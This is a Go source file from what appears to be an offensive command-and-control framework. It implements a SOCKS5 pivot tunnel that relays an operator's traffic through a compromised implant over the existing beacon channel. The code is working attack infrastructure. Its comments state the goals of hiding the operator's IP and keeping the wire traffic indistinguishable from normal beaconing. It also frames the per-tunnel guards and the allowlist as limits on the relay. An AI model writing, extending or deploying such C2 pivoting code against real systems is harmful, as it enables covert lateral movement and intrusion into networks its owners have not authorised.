// Package c2 — implant pivot tunnel.
//
// Design (Mode A): a tunnel is a loopback-only SOCKS5 listener on the ARTEX
// server that relays TCP connections through a compromised implant over the
// existing beacon channel. The feeding MITM/agents point their upstream proxy
// at socks5://<user>:<pass>@127.0.0.1:<port>, so captured traffic exits from
// the implant host without touching the operator's IP.
//
// Framing — frames are compact pipe-separated strings, one per line, chosen
// so the bash implant can parse them without a JSON decoder:
//
//		<tunnelID>|<connID>|<op>|<base64 payload>
//
//	  - tunnelID: 8 hex chars, random per tunnel.
//	  - connID:   decimal uint32, assigned per accepted SOCKS5 connection.
//	  - op:       "open" (payload = base64 "host:port", server→implant;
//	    uplink with empty payload = implant connected OK),
//	    "data" (payload = base64 bytes), "close" (empty payload).
//
// Transport — downlink frames (server→implant) are queued as internal tasks
// with Cmd "tunnel" carrying the frame string (base64'd by the normal task
// header path); they are dequeued ahead of shell tasks so tunnel latency does
// not depend on unrelated queued work. Uplink frames (implant→server) ride
// the normal result endpoint as one POST with task_id "tun" whose output is
// the base64 of newline-separated frames, so no new endpoint or header exists
// on the wire and the malleable profile stays unchanged.
//
// Guards — every tunnel carries: TTL (default 15 min), idle timeout (90 s
// with no open connections), stall timeout (5 min without frame activity),
// a byte cap (default 32 MB, up+down combined), a per-tunnel connection cap,
// a per-implant pending-frame cap, a global tunnel cap, and an allowlist that
// defaults to exactly the requested target (the implant must never become an
// open relay). Hitting a guard closes the affected connection or the whole
// tunnel; nothing is left listening.
package c2

import (
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// CmdTunnel is the internal task command carrying a downlink frame. It never
// crosses the console/tool API (those still accept shell|kill only).
const CmdTunnel = "tunnel"

// tunnelResultID is the sentinel task_id implants use when posting uplink
// frames to the result endpoint.
const tunnelResultID = "tun"

const (
	tunnelFrameMax     = 16 << 10         // max payload bytes per frame
	tunnelMaxConns     = 16               // concurrent connections per tunnel
	tunnelMaxPending   = 128              // queued frames per implant
	tunnelDialTimeout  = 30 * time.Second // wait for the implant's open ack
	defaultTunnelTTL   = 15 * time.Minute // total tunnel lifetime
	tunnelIdleTimeout  = 90 * time.Second // close when no conns are open
	tunnelStallTimeout = 5 * time.Minute  // close when frames stop flowing
	defaultTunnelMaxMB = 32               // combined up+down byte cap
	maxTunnels         = 8                // concurrent tunnels, process-wide
	tunnelIDLen        = 4                // bytes of hex entropy per tunnel ID
)

// Tunnel is one live implant-pivot tunnel. Counters are atomic; the conn map
// is guarded by mu. Snapshots copy the struct so callers never see mutations.
type Tunnel struct {
	ID        string        `json:"id"`
	ImplantID string        `json:"implant_id"`
	Target    string        `json:"target"` // operator-requested target (display + default allow)
	Addr      string        `json:"addr"`   // loopback SOCKS5 listen address
	User      string        `json:"user"`
	Pass      string        `json:"pass"`
	Allow     []string      `json:"allow,omitempty"`
	CreatedAt time.Time     `json:"created_at"`
	TTL       time.Duration `json:"ttl"`
	MaxBytes  int64         `json:"max_bytes"`

	Up   atomic.Int64 `json:"-"` // bytes client→target (downlink frames)
	Down atomic.Int64 `json:"-"` // bytes target→client (uplink frames)

	lastActivity atomic.Int64 // unix seconds of last frame activity
	closed       chan struct{}
	closeOnce    sync.Once
	ln           net.Listener

	mu       sync.Mutex
	conns    map[uint32]*tunnelConn
	nextConn uint32
}

// tunnelConn is one relayed TCP connection through the implant.
type tunnelConn struct {
	id      uint32
	target  string
	client  net.Conn
	ready   chan error  // receives the implant's dial outcome
	uplink  chan []byte // implant→client bytes (closed on conn end)
	flushed chan struct{}
	pumping atomic.Bool // pumpUplink is running (drain before closing)
	closed  atomic.Bool
}

// TunnelOpts controls OpenTunnel.
type TunnelOpts struct {
	ImplantID  string   // implant that will egress
	Target     string   // default "host:port"
	Allow      []string // extra allowlist entries ("host", "host:port", "host:*"); empty = Target only
	TTLMinutes int      // total lifetime (default 15, max 240)
	MaxMB      int      // byte cap (default 32, max 512)
	Auth       bool     // require SOCKS5 user/pass
}

// TunnelManager owns every live tunnel. Safe for concurrent use.
type TunnelManager struct {
	mu      sync.Mutex
	tunnels map[string]*Tunnel
	push    func(implantID, frame string) error // enqueue a downlink frame
}

func newTunnelManager(push func(implantID, frame string) error) *TunnelManager {
	tm := &TunnelManager{tunnels: map[string]*Tunnel{}, push: push}
	go tm.reap()
	return tm
}

// TunnelMgr returns the manager's tunnel manager (never nil after NewManager).
func (m *Manager) TunnelMgr() *TunnelManager { return m.tun }

// OpenTunnel creates a tunnel bound to 127.0.0.1 on an ephemeral port.
func (tm *TunnelManager) OpenTunnel(o TunnelOpts) (*Tunnel, error) {
	target := strings.TrimSpace(o.Target)
	host, port, err := net.SplitHostPort(target)
	if err != nil || host == "" || port == "" {
		return nil, fmt.Errorf("c2: target must be host:port, got %q", o.Target)
	}
	if net.ParseIP(host) == nil {
		if _, err := net.LookupHost(host); err != nil {
			return nil, fmt.Errorf("c2: tunnel target %q is not resolvable", host)
		}
	}
	ttl := defaultTunnelTTL
	if o.TTLMinutes > 0 {
		ttl = time.Duration(o.TTLMinutes) * time.Minute
	}
	if ttl > 240*time.Minute {
		ttl = 240 * time.Minute
	}
	maxBytes := int64(defaultTunnelMaxMB) << 20
	if o.MaxMB > 0 {
		maxBytes = int64(o.MaxMB) << 20
	}
	if maxBytes > int64(512)<<20 {
		maxBytes = int64(512) << 20
	}
	allow := o.Allow
	if len(allow) == 0 {
		allow = []string{target}
	}
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		return nil, fmt.Errorf("c2: tunnel listen: %w", err)
	}
	t := &Tunnel{
		ID:        newHex(tunnelIDLen),
		ImplantID: o.ImplantID,
		Target:    target,
		Addr:      ln.Addr().String(),
		Allow:     allow,
		CreatedAt: time.Now().UTC(),
		TTL:       ttl,
		MaxBytes:  maxBytes,
		closed:    make(chan struct{}),
		conns:     map[uint32]*tunnelConn{},
		ln:        ln,
	}
	if o.Auth {
		t.User = "u" + newHex(6)
		t.Pass = newHex(12)
	}
	t.lastActivity.Store(time.Now().Unix())

	tm.mu.Lock()
	if len(tm.tunnels) >= maxTunnels {
		tm.mu.Unlock()
		_ = ln.Close()
		return nil, fmt.Errorf("c2: too many active tunnels (max %d)", maxTunnels)
	}
	tm.tunnels[t.ID] = t
	tm.mu.Unlock()

	go func() {
		for {
			c, err := ln.Accept()
			if err != nil {
				return // tunnel closed (listener shut down)
			}
			go t.serveConn(tm, c)
		}
	}()
	return t, nil
}

// TunnelInfo is a snapshot of one tunnel for display (no locks/atomics).
type TunnelInfo struct {
	ID        string    `json:"id"`
	ImplantID string    `json:"implant_id"`
	Target    string    `json:"target"`
	Proxy     string    `json:"proxy"` // socks5://user:pass@addr
	Allow     []string  `json:"allow,omitempty"`
	CreatedAt time.Time `json:"created_at"`
	ExpiresAt time.Time `json:"expires_at"`
	Conns     int       `json:"conns"`
	UpBytes   int64     `json:"up_bytes"`
	DownBytes int64     `json:"down_bytes"`
	MaxBytes  int64     `json:"max_bytes"`
}

func (t *Tunnel) info() TunnelInfo {
	t.mu.Lock()
	conns := len(t.conns)
	t.mu.Unlock()
	proxy := "socks5://" + t.Addr
	if t.Pass != "" {
		proxy = "socks5://" + t.User + ":" + t.Pass + "@" + t.Addr
	}
	return TunnelInfo{
		ID:        t.ID,
		ImplantID: t.ImplantID,
		Target:    t.Target,
		Proxy:     proxy,
		Allow:     t.Allow,
		CreatedAt: t.CreatedAt,
		ExpiresAt: t.CreatedAt.Add(t.TTL),
		Conns:     conns,
		UpBytes:   t.Up.Load(),
		DownBytes: t.Down.Load(),
		MaxBytes:  t.MaxBytes,
	}
}

// GetTunnel returns a snapshot of one tunnel.
func (tm *TunnelManager) GetTunnel(id string) (TunnelInfo, bool) {
	tm.mu.Lock()
	t, ok := tm.tunnels[id]
	tm.mu.Unlock()
	if !ok {
		return TunnelInfo{}, false
	}
	return t.info(), true
}

// ListTunnels returns snapshots of all live tunnels.
func (tm *TunnelManager) ListTunnels() []TunnelInfo {
	tm.mu.Lock()
	all := make([]*Tunnel, 0, len(tm.tunnels))
	for _, t := range tm.tunnels {
		all = append(all, t)
	}
	tm.mu.Unlock()
	out := make([]TunnelInfo, 0, len(all))
	for _, t := range all {
		out = append(out, t.info())
	}
	return out
}

// withTunnel runs fn on the live tunnel if it still exists.
func (tm *TunnelManager) withTunnel(id string, fn func(*Tunnel)) bool {
	tm.mu.Lock()
	t, ok := tm.tunnels[id]
	tm.mu.Unlock()
	if ok {
		fn(t)
	}
	return ok
}

// CloseAllTunnels tears every tunnel down (implant killed / server stop).
func (tm *TunnelManager) CloseAllTunnels() int {
	tm.mu.Lock()
	all := make([]*Tunnel, 0, len(tm.tunnels))
	for id, t := range tm.tunnels {
		all = append(all, t)
		delete(tm.tunnels, id)
	}
	tm.mu.Unlock()
	for _, t := range all {
		t.shutdown()
	}
	return len(all)
}

// CloseImplantTunnels tears down the tunnels of one implant.
func (tm *TunnelManager) CloseImplantTunnels(implantID string) int {
	tm.mu.Lock()
	var hit []*Tunnel
	for id, t := range tm.tunnels {
		if t.ImplantID == implantID {
			hit = append(hit, t)
			delete(tm.tunnels, id)
		}
	}
	tm.mu.Unlock()
	for _, t := range hit {
		t.shutdown()
	}
	return len(hit)
}

// CloseTunnel tears down a tunnel and asks the implant to drop its sockets.
func (tm *TunnelManager) CloseTunnel(id string) bool {
	tm.mu.Lock()
	t, ok := tm.tunnels[id]
	if ok {
		delete(tm.tunnels, id)
	}
	tm.mu.Unlock()
	if !ok {
		return false
	}
	t.shutdown()
	return true
}

// shutdown closes the listener, every conn, and notifies the implant.
func (t *Tunnel) shutdown() {
	t.closeOnce.Do(func() {
		close(t.closed)
		if t.ln != nil {
			_ = t.ln.Close()
		}
		t.mu.Lock()
		conns := make([]*tunnelConn, 0, len(t.conns))
		for _, c := range t.conns {
			conns = append(conns, c)
		}
		t.conns = map[uint32]*tunnelConn{}
		t.mu.Unlock()
		for _, c := range conns {
			t.endConn(nil, c, true)
		}
	})
}

// bytesLeft returns the remaining byte budget (≤0 when exhausted).
func (t *Tunnel) bytesLeft() int64 { return t.MaxBytes - (t.Up.Load() + t.Down.Load()) }

// allow reports whether host:port matches the tunnel allowlist.
func (t *Tunnel) allow(target string) bool {
	host, port, err := net.SplitHostPort(target)
	if err != nil {
		return false
	}
	for _, rule := range t.Allow {
		rh, rp, err := net.SplitHostPort(strings.TrimSpace(rule))
		if err != nil {
			rh, rp = strings.TrimSpace(rule), ""
		}
		if rh != "*" && rh != host {
			continue
		}
		if rp == "" || rp == "*" || rp == port {
			return true
		}
	}
	return false
}

// serveConn performs the SOCKS5 handshake and starts relaying. Only CONNECT
// is supported; anything else is rejected with a generic failure so the
// loopback listener never looks like anything but a SOCKS proxy.
func (t *Tunnel) serveConn(tm *TunnelManager, client net.Conn) {
	_ = client.SetDeadline(time.Now().Add(10 * time.Second))
	target, err := t.socksHandshake(client)
	if err != nil {
		_ = client.Close()
		return
	}
	_ = client.SetDeadline(time.Time{})

	t.mu.Lock()
	if !t.alive() || len(t.conns) >= tunnelMaxConns {
		t.mu.Unlock()
		_ = client.Close()
		return
	}
	t.nextConn++
	c := &tunnelConn{
		id:      t.nextConn,
		target:  target,
		client:  client,
		ready:   make(chan error, 1),
		uplink:  make(chan []byte, 64),
		flushed: make(chan struct{}),
	}
	t.conns[c.id] = c
	t.mu.Unlock()

	// Ask the implant to dial. The ack (or failure) arrives as an uplink
	// frame on the next check-in(s).
	if err := tm.push(t.ImplantID, buildFrame(t.ID, c.id, "open", []byte(target))); err != nil {
		t.dropConn(nil, c.id)
		_ = client.Close()
		return
	}
	select {
	case <-c.ready:
		socksReply(client, socksRepOK)
	case <-time.After(tunnelDialTimeout):
		socksReply(client, socksRepTTL)
		t.dropConn(nil, c.id)
		return
	case <-t.closed:
		_ = client.Close()
		return
	}
	c.pumping.Store(true)
	go t.pumpClient(tm, c) // client → implant (data frames)
	go t.pumpUplink(c)     // implant → client
}

// alive reports whether the tunnel is still open.
func (t *Tunnel) alive() bool {
	select {
	case <-t.closed:
		return false
	default:
		return true
	}
}

// pumpClient reads the SOCKS5 client and ships the bytes to the implant in
// data frames. Any transport or queue error ends the conn.
func (t *Tunnel) pumpClient(tm *TunnelManager, c *tunnelConn) {
	buf := make([]byte, tunnelFrameMax)
	for {
		n, err := c.client.Read(buf)
		if n > 0 {
			if t.Up.Add(int64(n)) > t.MaxBytes || t.bytesLeft() < 0 {
				t.endTunnel(tm)
				return
			}
			if tm != nil {
				if err := tm.push(t.ImplantID, buildFrame(t.ID, c.id, "data", buf[:n])); err != nil {
					t.dropConn(tm, c.id)
					return
				}
			}
			t.touch()
		}
		if err != nil {
			t.dropConn(tm, c.id)
			return
		}
	}
}

// pumpUplink writes bytes the implant relayed back to the SOCKS5 client and
// owns the client close so queued bytes are drained first.
func (t *Tunnel) pumpUplink(c *tunnelConn) {
	defer close(c.flushed)
	for b := range c.uplink {
		if _, err := c.client.Write(b); err != nil {
			return
		}
		t.touch()
	}
}

// dropConn closes one conn. notify sends a best-effort close frame so the
// implant releases its fd promptly.
func (t *Tunnel) dropConn(tm *TunnelManager, cid uint32) {
	t.mu.Lock()
	c, ok := t.conns[cid]
	if ok {
		delete(t.conns, cid)
	}
	t.mu.Unlock()
	if ok {
		t.endConn(tm, c, true)
	}
}

// endConn closes the client socket and stops the uplink pump. Any bytes still
// queued for the client are written before the socket goes away, so a close
// frame arriving right after a data burst cannot truncate a response.
func (t *Tunnel) endConn(tm *TunnelManager, c *tunnelConn, notify bool) {
	if c == nil || !c.closed.CompareAndSwap(false, true) {
		return
	}
	if notify && t.alive() && tm != nil {
		_ = tm.push(t.ImplantID, buildFrame(t.ID, c.id, "close", nil))
	}
	close(c.uplink)
	if c.pumping.Load() {
		select {
		case <-c.flushed:
		case <-time.After(2 * time.Second):
		}
	}
	_ = c.client.Close()
}

// endTunnel closes the whole tunnel (guard trip).
func (t *Tunnel) endTunnel(tm *TunnelManager) {
	if tm != nil {
		tm.mu.Lock()
		if _, ok := tm.tunnels[t.ID]; ok {
			delete(tm.tunnels, t.ID)
		}
		tm.mu.Unlock()
	}
	t.shutdown()
}

// touch records frame activity for idle/stall accounting.
func (t *Tunnel) touch() { t.lastActivity.Store(time.Now().Unix()) }

// ingest applies one uplink frame from an implant.
func (t *Tunnel) ingest(tm *TunnelManager, f tunnelFrame) {
	t.mu.Lock()
	c, ok := t.conns[f.ConnID]
	t.mu.Unlock()
	t.touch()
	if !ok {
		return // stale or already-closed conn
	}
	switch f.Op {
	case "open":
		select {
		case c.ready <- nil:
		default:
		}
	case "close":
		t.dropConn(tm, f.ConnID)
	case "data":
		n := int64(len(f.Payload))
		if t.Down.Add(n) > t.MaxBytes || t.bytesLeft() < 0 {
			t.endTunnel(tm)
			return
		}
		select {
		case c.uplink <- f.Payload:
		case <-time.After(5 * time.Second):
			t.dropConn(tm, f.ConnID)
		}
	}
}

// reap enforces TTL / idle / stall guards.
func (tm *TunnelManager) reap() {
	tick := time.NewTicker(5 * time.Second)
	defer tick.Stop()
	for range tick.C {
		tm.mu.Lock()
		var expired []*Tunnel
		for id, t := range tm.tunnels {
			last := time.Unix(t.lastActivity.Load(), 0)
			t.mu.Lock()
			conns := len(t.conns)
			t.mu.Unlock()
			switch {
			case time.Since(t.CreatedAt) > t.TTL:
				expired = append(expired, t)
				delete(tm.tunnels, id)
			case conns == 0 && time.Since(last) > tunnelIdleTimeout:
				expired = append(expired, t)
				delete(tm.tunnels, id)
			case conns > 0 && time.Since(last) > tunnelStallTimeout:
				expired = append(expired, t)
				delete(tm.tunnels, id)
			}
		}
		tm.mu.Unlock()
		for _, t := range expired {
			t.shutdown()
		}
	}
}

// ---------------------------------------------------------------------------
// Frame codec

func buildFrame(tunnelID string, connID uint32, op string, payload []byte) string {
	return tunnelID + "|" + strconv.FormatUint(uint64(connID), 10) + "|" + op + "|" + base64.StdEncoding.EncodeToString(payload)
}

type tunnelFrame struct {
	TunnelID string
	ConnID   uint32
	Op       string
	Payload  []byte
}

// parseFrames decodes newline-separated uplink frames; malformed lines are
// skipped so one bad frame can never poison the whole batch.
func parseFrames(s string) []tunnelFrame {
	var out []tunnelFrame
	for _, line := range strings.Split(s, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		parts := strings.SplitN(line, "|", 4)
		if len(parts) != 4 {
			continue
		}
		cid, err := strconv.ParseUint(parts[1], 10, 32)
		if err != nil {
			continue
		}
		switch parts[2] {
		case "open", "data", "close":
		default:
			continue
		}
		payload, err := base64.StdEncoding.DecodeString(parts[3])
		if err != nil {
			continue
		}
		if parts[2] == "data" && len(payload) > tunnelFrameMax {
			continue
		}
		out = append(out, tunnelFrame{TunnelID: parts[0], ConnID: uint32(cid), Op: parts[2], Payload: payload})
	}
	return out
}

// ---------------------------------------------------------------------------
// Minimal SOCKS5 (CONNECT only)

const (
	socksRepOK              = 0x00
	socksRepHostUnreachable = 0x04
	socksRepTTL             = 0x06
)

// socksHandshake performs greeting/auth/CONNECT parsing and returns the
// validated target "host:port".
func (t *Tunnel) socksHandshake(c net.Conn) (string, error) {
	var hdr [2]byte
	if _, err := readFull(c, hdr[:]); err != nil {
		return "", err
	}
	if hdr[0] != 5 {
		return "", fmt.Errorf("not socks5")
	}
	methods := make([]byte, hdr[1])
	if _, err := readFull(c, methods); err != nil {
		return "", err
	}
	wantAuth := t.Pass != ""
	chosen := byte(0xFF)
	for _, m := range methods {
		if wantAuth && m == 2 {
			chosen = 2
			break
		}
		if !wantAuth && m == 0 {
			chosen = 0
			break
		}
	}
	if chosen == 0xFF {
		// Never accept a method we did not offer.
		_, _ = c.Write([]byte{5, 0xFF})
		return "", fmt.Errorf("no acceptable auth method")
	}
	if _, err := c.Write([]byte{5, chosen}); err != nil {
		return "", err
	}
	if chosen == 2 {
		if err := t.socksAuth(c); err != nil {
			return "", err
		}
	}
	var req [4]byte
	if _, err := readFull(c, req[:]); err != nil {
		return "", err
	}
	if req[0] != 5 || req[1] != 1 { // CONNECT only
		socksReply(c, socksRepHostUnreachable)
		return "", fmt.Errorf("unsupported socks command")
	}
	var host string
	switch req[3] {
	case 1: // IPv4
		var b [4]byte
		if _, err := readFull(c, b[:]); err != nil {
			return "", err
		}
		host = net.IP(b[:]).String()
	case 3: // domain
		var l [1]byte
		if _, err := readFull(c, l[:]); err != nil {
			return "", err
		}
		d := make([]byte, l[0])
		if _, err := readFull(c, d); err != nil {
			return "", err
		}
		host = string(d)
	case 4: // IPv6
		var b [16]byte
		if _, err := readFull(c, b[:]); err != nil {
			return "", err
		}
		host = net.IP(b[:]).String()
	default:
		socksReply(c, socksRepHostUnreachable)
		return "", fmt.Errorf("bad socks atyp")
	}
	var pb [2]byte
	if _, err := readFull(c, pb[:]); err != nil {
		return "", err
	}
	port := strconv.Itoa(int(binary.BigEndian.Uint16(pb[:])))
	target := net.JoinHostPort(host, port)
	if !t.allow(target) {
		socksReply(c, socksRepHostUnreachable)
		return "", fmt.Errorf("target %q not allowed", target)
	}
	return target, nil
}

// socksAuth checks the RFC 1929 user/pass sub-negotiation.
func (t *Tunnel) socksAuth(c net.Conn) error {
	var ul [2]byte
	if _, err := readFull(c, ul[:]); err != nil {
		return err
	}
	user := make([]byte, ul[1])
	if _, err := readFull(c, user); err != nil {
		return err
	}
	var pl [1]byte
	if _, err := readFull(c, pl[:]); err != nil {
		return err
	}
	pass := make([]byte, pl[0])
	if _, err := readFull(c, pass); err != nil {
		return err
	}
	if string(user) != t.User || string(pass) != t.Pass {
		_, _ = c.Write([]byte{1, 1})
		return fmt.Errorf("bad socks credentials")
	}
	_, _ = c.Write([]byte{1, 0})
	return nil
}

// readFull fills buf completely.
func readFull(c net.Conn, buf []byte) (int, error) {
	total := 0
	for total < len(buf) {
		n, err := c.Read(buf[total:])
		total += n
		if err != nil {
			return total, err
		}
	}
	return total, nil
}

func socksReply(c net.Conn, code byte) {
	// BND.ADDR 0.0.0.0:0 — standard for proxies that do not bind locally.
	_, _ = c.Write([]byte{5, code, 0, 1, 0, 0, 0, 0, 0, 0})
}
